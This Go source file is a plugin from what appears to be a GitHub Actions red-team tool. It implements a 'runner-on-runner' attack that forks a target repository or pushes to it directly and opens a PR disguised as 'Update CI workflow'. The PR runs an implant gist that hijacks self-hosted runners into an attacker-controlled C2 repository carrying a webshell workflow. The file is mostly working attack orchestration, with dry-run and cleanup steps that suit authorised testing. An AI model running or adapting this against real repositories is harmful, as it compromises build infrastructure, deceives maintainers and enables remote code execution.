package runneronrunner

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("github", "runner-on-runner", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements runner-on-runner attack via fork-PR technique
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new runner-on-runner attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"runner-on-runner",
			"Pivot from PR trigger to compromise self-hosted runners via implant",
			"github",
			attacks.CategoryRunners,
		),
	}
}

// CanAttack checks if runner-on-runner attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Requires pwn_request or self-hosted runner vulnerability
	return common.FindingHasType(findings, detections.VulnPwnRequest) ||
		common.FindingHasType(findings, detections.VulnSelfHostedRunner)
}

// Execute performs the runner-on-runner attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get GitHub platform
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	// Parse target repository
	owner, repo, err := common.ParseOwnerRepo(opts.Target)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get RoR options from ExtraOpts
	c2Repo := opts.ExtraOpts["c2_repo"]
	targetOS := getOrDefault(opts.ExtraOpts, "target_os", "linux")
	targetArch := getOrDefault(opts.ExtraOpts, "target_arch", "x64")
	runnerLabels := getOrDefault(opts.ExtraOpts, "runner_labels", "self-hosted")
	keepAlive := opts.ExtraOpts["keep_alive"] == "true"

	// Fail fast: app tokens have no user namespace, require explicit C2 repo
	isApp := client.IsGitHubAppToken()
	if isApp && c2Repo == "" {
		result.Success = false
		result.Message = "installation token requires an explicit C2 repo: pass --c2-repo <owner>/<repo> (GitHub App tokens have no user namespace and cannot create one)"
		return result, fmt.Errorf("missing --c2-repo for installation token")
	}

	// Validate target repository uses self-hosted runners
	hasSelfHosted, err := checkForSelfHostedRunners(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to check workflows: %v", err)
		return result, err
	}

	if !hasSelfHosted {
		result.Success = false
		result.Message = "runner-on-runner attack requires target repository to use self-hosted runners (runs-on: self-hosted). This repository only uses GitHub-hosted runners."
		return result, fmt.Errorf("target repository does not use self-hosted runners")
	}

	// Dry-run: return simulated plan without creating any resources
	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would perform runner-on-runner attack"
		result.Data = map[string]interface{}{
			"c2_repo":       c2Repo,
			"target_os":     targetOS,
			"target_arch":   targetArch,
			"runner_labels": runnerLabels,
		}
		return result, nil
	}

	// Step 1: Create or use C2 repository
	if c2Repo == "" {
		c2Repo, err = createC2Repository(ctx, client, opts.SessionID)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to create C2 repository: %v", err)
			return result, err
		}
		result.Artifacts = append(result.Artifacts, attacks.Artifact{
			Type:        attacks.ArtifactRepository,
			Identifier:  c2Repo,
			Description: "C2 repository created",
		})
	}

	// Step 2: Generate implant gist
	gistID, gistURL, err := createRoRGist(ctx, client, c2Repo, targetOS, targetArch, keepAlive)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create implant gist: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactFile,
		Identifier:  gistID,
		Description: "Implant gist created",
		URL:         gistURL,
	})

	// Step 3-6: Token-aware delivery — app tokens push directly into target; user tokens fork.
	var headOwner, headRepo, prHead string
	branchName := fmt.Sprintf("trajan-ror-%s", opts.SessionID)

	if isApp {
		headOwner, headRepo = owner, repo
		prHead = branchName // same-repo head
	} else {
		fork, err := client.ForkRepository(ctx, owner, repo)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to fork repository: %v", err)
			return result, err
		}
		result.Artifacts = append(result.Artifacts, attacks.Artifact{
			Type: attacks.ArtifactRepository, Identifier: fork.FullName,
			Description: "Forked repository", URL: fork.HTMLURL,
		})
		time.Sleep(5 * time.Second)
		headOwner, headRepo = fork.Owner.Login, fork.Name
		prHead = fmt.Sprintf("%s:%s", fork.Owner.Login, branchName)
	}

	defaultBranch, err := common.GetDefaultBranch(ctx, client, headOwner, headRepo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}
	branchSHA, err := common.GetBranchSHA(ctx, client, headOwner, headRepo, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get branch SHA: %v", err)
		return result, err
	}
	if _, err = client.CreateBranch(ctx, headOwner, headRepo, branchName, branchSHA); err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch (installation may lack Contents:write): %v", err)
		return result, err
	}
	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type: attacks.ArtifactBranch, Identifier: branchName, Description: "Attack branch",
	})

	rorWorkflow := common.RoRWorkflowPayload(gistURL, runnerLabels, targetOS)
	workflowPath := ".github/workflows/trajan-ror.yml"
	if _, err = client.CreateOrUpdateFile(ctx, headOwner, headRepo, workflowPath,
		github.FileContentInput{Message: "Add test workflow", Content: common.EncodeBase64(rorWorkflow), Branch: branchName}); err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to deploy workflow (installation may lack Contents:write): %v", err)
		return result, err
	}
	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type: attacks.ArtifactWorkflow, Identifier: workflowPath, Description: "RoR workflow deployed",
	})

	pr, err := client.CreatePullRequest(ctx, owner, repo, github.PullRequestInput{
		Title: "Update CI workflow", Body: "CI improvements", Head: prHead, Base: defaultBranch, Draft: true,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create PR (installation may lack Pull-requests:write): %v", err)
		return result, err
	}
	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type: attacks.ArtifactPR, Identifier: fmt.Sprintf("%d", pr.Number), URL: pr.HTMLURL, Description: "Attack PR created",
	})

	// Step 7: Parse C2 repo owner/name
	c2Parts := strings.Split(c2Repo, "/")
	var c2Owner, c2RepoName string
	if len(c2Parts) == 2 {
		c2Owner, c2RepoName = c2Parts[0], c2Parts[1]
	} else if isApp {
		result.Success = false
		result.Message = "installation token requires --c2-repo in owner/repo form"
		return result, fmt.Errorf("invalid --c2-repo for installation token")
	} else {
		// Get authenticated user
		user, err := client.GetUser(ctx)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to get authenticated user: %v", err)
			return result, err
		}
		c2Owner, c2RepoName = user.Login, c2Repo
	}

	// Step 8: Poll for runner connection
	runners, err := pollForRunners(ctx, client, c2Owner, c2RepoName, opts.Timeout)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("no runners connected: %v", err)
		return result, err
	}

	// Step 9: Cleanup gist after successful implant
	cleanupActions := []attacks.CleanupAction{
		{Type: attacks.ArtifactPR, Identifier: fmt.Sprintf("%d", pr.Number), Action: "close", Description: "Close attack PR"},
	}
	if !isApp {
		cleanupActions = append(cleanupActions, attacks.CleanupAction{
			Type: attacks.ArtifactRepository, Identifier: fmt.Sprintf("%s/%s", headOwner, headRepo),
			Action: "delete", Description: "Delete fork",
		})
	}

	// Only cleanup C2 repo if we created it
	if c2Repo != opts.ExtraOpts["c2_repo"] {
		cleanupActions = append(cleanupActions, attacks.CleanupAction{
			Type:        attacks.ArtifactRepository,
			Identifier:  c2Repo,
			Action:      "delete",
			Description: "Delete C2 repository",
		})
	}

	if err := client.DeleteGist(ctx, gistID); err != nil {
		// If cleanup fails here, ensure the session cleanup will still try.
		cleanupActions = append(cleanupActions, attacks.CleanupAction{
			Type:        attacks.ArtifactFile,
			Identifier:  gistID,
			Action:      "delete",
			Description: "Delete implant gist",
		})
	}

	result.Success = true
	result.Message = fmt.Sprintf("Runner-on-runner successful. %d runner(s) connected.", len(runners))
	result.Data = map[string]interface{}{
		"c2_repo": c2Repo,
		"runners": runners,
	}
	result.CleanupActions = cleanupActions

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	// Cleanup this plugin's results
	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		// Parse owner/repo from per-result repo (supports org-wide attacks)
		var owner, repo string
		var err error
		if result.Repo != "" {
			owner, repo, err = common.ParseRepoString(result.Repo)
		} else {
			owner, repo, err = common.ParseOwnerRepo(session.Target)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Skipping cleanup for %s: %v\n", result.Plugin, err)
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactPR:
				prNumber, err := strconv.Atoi(action.Identifier)
				if err != nil {
					return fmt.Errorf("parsing PR number %q: %w", action.Identifier, err)
				}
				if err := client.ClosePullRequest(ctx, owner, repo, prNumber); err != nil {
					return fmt.Errorf("closing PR %d: %w", prNumber, err)
				}

			case attacks.ArtifactRepository:
				parts := strings.Split(action.Identifier, "/")
				if len(parts) == 2 {
					if err := client.DeleteRepository(ctx, parts[0], parts[1]); err != nil {
						return fmt.Errorf("deleting repository %s: %w", action.Identifier, err)
					}
				}

			case attacks.ArtifactFile:
				// Delete gist
				if err := client.DeleteGist(ctx, action.Identifier); err != nil {
					return fmt.Errorf("deleting gist %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}

// Helper functions

// getOrDefault returns the value from map or default if not found
func getOrDefault(m map[string]string, key, defaultValue string) string {
	if v, ok := m[key]; ok && v != "" {
		return v
	}
	return defaultValue
}

// createC2Repository creates a C2 repository with webshell workflow
func createC2Repository(ctx context.Context, client *github.Client, sessionID string) (string, error) {
	// Generate random repository name
	repoName := fmt.Sprintf("trajan-c2-%s", common.GenerateRandomString(10))

	// Create private repository
	repo, err := client.CreateRepository(ctx, github.CreateRepositoryInput{
		Name:     repoName,
		Private:  true,
		AutoInit: true, // Initialize with README to have default branch
	})
	if err != nil {
		return "", fmt.Errorf("creating repository: %w", err)
	}

	// Wait for repository to be ready
	time.Sleep(3 * time.Second)

	// Deploy webshell workflow
	workflowContent := common.WebshellWorkflowPayloadBase64()
	_, err = client.CreateOrUpdateFile(ctx, repo.Owner.Login, repo.Name,
		".github/workflows/webshell.yml", github.FileContentInput{
			Message: "Add webshell workflow",
			Content: workflowContent,
			Branch:  repo.DefaultBranch,
		})
	if err != nil {
		return "", fmt.Errorf("creating workflow: %w", err)
	}

	return repo.FullName, nil
}

// createRoRGist creates a gist with the runner implant script
func createRoRGist(ctx context.Context, client *github.Client, c2Repo, targetOS, targetArch string, keepAlive bool) (string, string, error) {
	// Get runner registration token
	c2Parts := strings.Split(c2Repo, "/")
	if len(c2Parts) != 2 {
		return "", "", fmt.Errorf("invalid C2 repo format: %s", c2Repo)
	}
	c2Owner, c2RepoName := c2Parts[0], c2Parts[1]

	regToken, err := client.GetRunnerRegistrationToken(ctx, c2Owner, c2RepoName)
	if err != nil {
		return "", "", fmt.Errorf("getting registration token: %w", err)
	}

	// Get latest runner release
	release, err := client.GetLatestRunnerRelease(ctx)
	if err != nil {
		return "", "", fmt.Errorf("getting runner release: %w", err)
	}

	// Find matching asset for target OS/arch
	var releaseFile string
	var version string
	version = release.TagName

	// Determine release file based on OS and arch
	osMap := map[string]string{
		"linux": "linux",
		"win":   "win",
		"macos": "osx",
	}
	archMap := map[string]string{
		"x64":   "x64",
		"arm64": "arm64",
		"arm":   "arm",
	}

	osName := osMap[targetOS]
	archName := archMap[targetArch]
	if targetOS == "win" {
		releaseFile = fmt.Sprintf("actions-runner-win-%s-%s.zip", archName, strings.TrimPrefix(version, "v"))
	} else {
		releaseFile = fmt.Sprintf("actions-runner-%s-%s-%s.tar.gz", osName, archName, strings.TrimPrefix(version, "v"))
	}

	// Generate runner name
	runnerName := common.GenerateRandomString(8)

	// Generate implant script
	implantScript := common.RoRGistPayload(regToken, c2Repo, releaseFile, version, keepAlive, runnerName)

	// Create gist
	gist, err := client.CreateGist(ctx, "Runner implant", false, map[string]string{
		"implant.sh": implantScript,
	})
	if err != nil {
		return "", "", fmt.Errorf("creating gist: %w", err)
	}

	// Get raw URL for the implant script
	rawURL := fmt.Sprintf("https://gist.githubusercontent.com/%s/raw/implant.sh", gist.ID)

	return gist.ID, rawURL, nil
}

// pollForRunners polls the C2 repository for runner connections
func pollForRunners(ctx context.Context, client *github.Client, owner, repo string, timeout time.Duration) ([]github.Runner, error) {
	if timeout == 0 {
		timeout = 5 * time.Minute // Default timeout
	}

	startTime := time.Now()
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-ticker.C:
			if time.Since(startTime) > timeout {
				return nil, fmt.Errorf("timeout waiting for runners")
			}

			runners, err := client.GetRunners(ctx, owner, repo)
			if err != nil {
				continue // Retry on error
			}

			// Filter for trajan runners
			var trajanRunners []github.Runner
			for _, r := range runners {
				if strings.HasPrefix(r.Name, "trajan-") {
					trajanRunners = append(trajanRunners, r)
				}
			}

			if len(trajanRunners) > 0 {
				return trajanRunners, nil
			}
		}
	}
}

// Dependencies implements ChainableAttackPlugin
func (p *Plugin) Dependencies() []string {
	return nil // c2-setup is optional, we create C2 if needed
}

// OptionalDependencies implements ChainableAttackPlugin
func (p *Plugin) OptionalDependencies() []string {
	return []string{"c2-setup"} // If c2-setup ran, reuse its C2 repo
}

// Provides implements ChainableAttackPlugin
func (p *Plugin) Provides() []attacks.ContextKey {
	return []attacks.ContextKey{
		attacks.C2RepoKey,
		attacks.RunnersKey,
		attacks.GistIDKey,
		attacks.ForkRepoKey,
		attacks.PRNumberKey,
	}
}

// Requires implements ChainableAttackPlugin
func (p *Plugin) Requires() []attacks.ContextKey {
	return nil // No hard requirements - creates C2 if needed
}

// checkForSelfHostedRunners validates that the target repository uses self-hosted runners
func checkForSelfHostedRunners(ctx context.Context, client *github.Client, owner, repo string) (bool, error) {
	// Get workflow files
	workflows, err := client.GetWorkflowFiles(ctx, owner, repo)
	if err != nil {
		return false, fmt.Errorf("getting workflow files: %w", err)
	}

	// Check each workflow for self-hosted runner usage
	for _, wf := range workflows {
		content, err := client.GetWorkflowContent(ctx, owner, repo, wf.Path)
		if err != nil {
			// Log error but continue checking other workflows
			continue
		}

		// Check for self-hosted runner in YAML content (runs-on semantics)
		contentStr := string(content)
		if strings.Contains(contentStr, "runs-on: self-hosted") ||
			strings.Contains(contentStr, "runs-on: [self-hosted") ||
			strings.Contains(contentStr, "runs-on: 'self-hosted") ||
			strings.Contains(contentStr, "runs-on: \"self-hosted") ||
			strings.Contains(contentStr, "- self-hosted") {
			return true, nil
		}
	}

	return false, nil
}
